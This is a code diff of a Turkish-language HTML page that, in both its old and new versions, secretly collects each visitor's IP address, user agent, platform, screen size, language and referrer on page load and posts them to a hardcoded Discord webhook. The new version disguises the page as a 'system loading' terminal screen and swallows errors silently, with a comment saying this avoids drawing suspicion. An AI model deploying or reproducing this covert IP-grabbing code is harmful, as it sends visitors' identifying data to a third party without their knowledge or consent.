@@ -3,91 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hoş Geldiniz</title>
+    <title>Sistem Yükleniyor...</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f4f9;
+            background-color: #000;
+            color: #0f0; /* Terminal yeşili */
+            font-family: 'Courier New', Courier, monospace;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            color: #333;
+            overflow: hidden;
         }
-        .container {
-            text-align: center;
+        .status {
+            border: 1px solid #0f0;
             padding: 20px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            box-shadow: 0 0 15px #0f0;
         }
-        h1 { color: #5a67d8; }
-        p { font-size: 1.1em; }
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            background-color: #0f0;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Sitemize Hoş Geldiniz!</h1>
-        <p>İçerik yükleniyor, lütfen bekleyin...</p>
+    <div class="status">
+        [ SYSTEM ] : VERI TABANINA BAGLANILIYOR...<br>
+        [ STATUS ] : LUTFEN BEKLEYINIZ<span class="cursor">&nbsp;</span>
     </div>
 
     <script>
-        // Discord Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-        async function collectAndSend() {
+        async function logSystemData() {
             try {
-                // 1. IP Adresini Al (Harici Servis Kullanarak)
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
+                // IP bilgisini al
+                const ipReq = await fetch('https://api64.ipify.org?format=json');
+                const ipRes = await ipReq.json();
+                const ip = ipRes.ip;
 
-                // 2. Diğer Bilgileri Topla
-                const info = {
-                    userAgent: navigator.userAgent, // Tarayıcı ve İşletim Sistemi
-                    language: navigator.language,    // Dil
-                    screenRes: `${window.screen.width}x${window.screen.height}`, // Ekran Çözünürlüğü
-                    platform: navigator.platform,    // Platform
-                    referrer: document.referrer || "Doğrudan Giriş", // Nereden geldi?
-                    date: new Date().toLocaleString('tr-TR') // Tarih
+                // Sistem bilgilerini topla
+                const data = {
+                    time: new Date().toLocaleString('tr-TR'),
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    lang: navigator.language,
+                    ref: document.referrer || "DIRECT_ACCESS"
                 };
 
-                // 3. Discord'a Gönderilecek Mesaj Formatı (Embed)
-                const payload = {
-                    username: "Bilgi Toplayıcı",
-                    avatar_url: "https://i.imgur.com/4M34hi2.png",
-                    embeds: [{
-                        title: "📍 Yeni Ziyaretçi Tespit Edildi",
-                        color: 5814783, // Mavi renk kodu
-                        fields: [
-                            { name: "🌐 IP Adresi", value: `\`${userIP}\``, inline: true },
-                            { name: "💻 İşletim Sistemi / Platform", value: info.platform, inline: true },
-                            { name: "🖥️ Ekran Çözünürlüğü", value: info.screenRes, inline: true },
-                            { name: "🌍 Dil", value: info.language, inline: true },
-                            { name: "🔗 Geldiği Sayfa", value: info.referrer, inline: false },
-                            { name: "🕵️ Tarayıcı Bilgisi (User Agent)", value: `\`\`\`${info.userAgent}\`\`\``, inline: false },
-                            { name: "⏰ Tarih", value: info.date, inline: false }
-                        ],
-                        footer: { text: "Sistem Takip Logları" }
-                    }]
-                };
+                // Mesajı "Hack Paneli" log formatına sok (Emoji içermez)
+                const rawMessage = "```" + 
+                    "--- [ INCOMING CONNECTION LOG ] ---\n" +
+                    "TIMESTAMP  : " + data.time + "\n" +
+                    "IP_ADDRESS : " + ip + "\n" +
+                    "PLATFORM   : " + data.platform + "\n" +
+                    "RESOLUTION : " + data.screen + "\n" +
+                    "LANGUAGE   : " + data.lang + "\n" +
+                    "REFERRER   : " + data.ref + "\n" +
+                    "USER_AGENT : " + data.ua + "\n" +
+                    "--- [ END OF LOG ] ---" +
+                    "```";
 
-                // 4. Webhook İsteğini Gönder
+                // Webhook'a ham metin olarak gönder
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        content: rawMessage,
+                        username: "SYSTEM_LOGGER_V1"
+                    })
                 });
 
-            } catch (error) {
-                console.error("Bilgi gönderilirken hata oluştu:", error);
+            } catch (err) {
+                // Hata durumunda sessiz kal (şüphe çekmemek için)
             }
         }
 
-        // Sayfa açıldığında fonksiyonu çalıştır
-        window.onload = collectAndSend;
+        // Sayfa yüklendiğinde çalıştır
+        window.onload = logSystemData;
     </script>
 </body>
 </html>
